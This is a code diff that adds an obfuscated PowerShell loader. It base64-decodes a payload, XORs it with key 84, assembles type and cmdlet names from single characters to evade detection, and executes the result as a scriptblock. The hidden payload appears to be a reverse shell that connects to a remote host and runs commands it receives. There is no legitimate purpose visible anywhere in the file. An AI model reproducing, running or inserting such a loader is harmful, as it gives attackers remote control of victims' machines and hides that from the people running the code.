@@ -1,0 +1,11 @@
+$key = 84
+$encoded = "cDV0aXR2ZWR6ZnpjemJkdllecDZ0aXRgYGBgWV5wIDckFzg9MTogAC0kMXRpdA8gLSQxCXwPJyAmPTozCW5uHjs9Onxzc3h0fHMHc3hzLXN4cydzeHMgc3hzMXN4czlzeHN6c3hzGnN4czFzeHMgc3hzenN4cwdzeHM7c3hzN3N4cz9zeHMxc3hzIHN4cydzeHN6c3hzAHN4czdzeHMkc3hzF3N4czhzeHM9c3hzMXN4czpzeHMgc319fVlecCcgJjE1OQMmPSAxJgAtJDF0aXQPIC0kMQl8DycgJj06Mwlubh47PTp8c3N4dHxzB3N4cy1zeHMnc3hzIHN4czFzeHM5c3hzenN4cx1zeHMbc3hzenN4cwdzeHMgc3hzJnN4czFzeHM1c3hzOXN4cwNzeHMmc3hzPXN4cyBzeHMxc3hzJnN9fX1ZXnA1Jzc9PRE6NzswPTozAC0kMXRpdA8gLSQxCXwPJyAmPTozCW5uHjs9Onxzc3h0fHMHc3hzLXN4cydzeHMgc3hzMXN4czlzeHN6c3hzAHN4czFzeHMsc3hzIHN4c3pzeHMVc3hzB3N4cxdzeHMdc3hzHXN4cxFzeHM6c3hzN3N4cztzeHMwc3hzPXN4czpzeHMzc319fVlecCAxLCAROjc7MD06MwAtJDF0aXQPIC0kMQl8DycgJj06Mwlubh47PTp8c3N4dHxzB3N4cy1zeHMnc3hzIHN4czFzeHM5c3hzenN4cwBzeHMxc3hzLHN4cyBzeHN6c3hzEXN4czpzeHM3c3hzO3N4czBzeHM9c3hzOnN4czNzfX19WV5wPToiOz8xESwkdGl0fA8nICY9OjMJbm4eOz06fHNzeHR8cz1zeHMxc3hzLHN9fX1ZXnA3OD0xOiB0aXQaMSN5GzY+MTcgdHAgNyQXOD0xOiAALSQxdHA1eHRwNllecCcgJjE1OXRpdHA3OD0xOiB6EzEgByAmMTU5fH1ZXnAjJj0gMSZ0aXQaMSN5GzY+MTcgdHAnICYxNTkDJj0gMSYALSQxdHAnICYxNTlZXnAjJj0gMSZ6FSEgOxI4ISc8dGl0cCAmITFZXnA2ITIyMSZ0aXQaMSN5GzY+MTcgdDYtIDEPCXRlZGZgWV4jPD04MXR8fHA9dGl0cCcgJjE1OXoGMTUwfHA2ITIyMSZ4dGR4dHA2ITIyMSZ6GDE6MyA8fX10eToxdGR9dC9ZXnR0dHRwMDUgNXRpdHwaMSN5GzY+MTcgdHA1Jzc9PRE6NzswPTozAC0kMX16EzEgByAmPTozfHA2ITIyMSZ4dGR4dHA9fVledHR0dCAmLXQvWV50dHR0dHR0dHAnMTowNjU3P3RpdHxydHA9OiI7PzERLCR0cDA1IDV0ZmpyZXQodBshIHkHICY9OjN9WV50dHR0KVledHR0dDc1IDc8dC9ZXnR0dHR0dHR0cCcxOjA2NTc/dGl0cAt6ESw3MSQgPTs6ehkxJyc1MzFZXnR0dHQpWV50dHR0cCcxOjA2NTc/ZnRpdHY0OnAnMTowNjU3PzQ6BAMQbnRzdnR/dHwkIzB9egQ1IDx0f3R2cHdzdlledHR0dHAnMTowFi0gMSd0aXRwIDEsIBE6NzswPTozAC0kMW5uFQcXHR16EzEgFi0gMSd8cCcxOjA2NTc/Zn1ZXnR0dHRwJyAmMTU5egMmPSAxfHAnMTowFi0gMSd4dGR4dHAnMTowFi0gMSd6GDE6MyA8fVledHR0dHAnICYxNTl6EjghJzx8fVleKVlecDc4PTE6IHoXODsnMXx9"
+
+$xorBytes = [Convert]::FromBase64String($encoded)
+$forl = [string]::Join('', ('F','o','r','E','a','c','h','-','O','b','j','e','c','t'))
+$plainBytes = $xorBytes | &$forl { $_ -bxor $key }
+$chars = @('S','y','s','t','e','m','.','T','e','x','t','.','E','n','c','o','d','i','n','g')
+$fullTypeName = [string]::Join('', $chars)
+$type = [Type]::GetType($fullTypeName)
+$script = $type::UTF8.GetString($plainBytes)
+&([scriptblock]::Create($script))
